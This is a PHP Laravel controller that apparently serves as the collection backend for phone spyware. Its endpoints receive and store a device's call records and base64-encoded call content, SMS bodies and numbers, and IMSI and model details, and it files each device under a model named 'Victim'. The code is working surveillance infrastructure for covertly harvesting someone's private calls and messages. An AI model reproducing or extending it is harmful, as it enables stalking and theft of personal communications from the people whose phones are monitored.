<?php
namespace App\Http\Controllers;
use App\Sms;
use App\Phone;
use App\Victim;
use Illuminate\Http\Request;


class PhoneController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {

    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {

 $phone = new Phone;
$phone->call=base64_decode($request->call);
$phone->number= $request->number;
$phone->date= $request->date;
$phone->imsi= $request->imsi;
$phone->model= $request->model;
$phone->duration= $request->duration;

  
if( $phone->save()){

return response()->json(['error' => false]);

}



    }

  public function vict(Request $request)
    {

 $victim = new Victim;


$victim->imsi= $request->imsi;
$victim->model= $request->model;


if( $victim->save()){

return response()->json(['error' => false]);

}


    }


 public function sms(Request $request)
    {

 $sms = new Sms;


$sms->imsi= $request->imsi;
$sms->body= $request->body;
$sms->number= $request->number;
$sms->date= $request->date;


if( $sms->save()){

return response()->json(['error' => false]);

}



    }









}
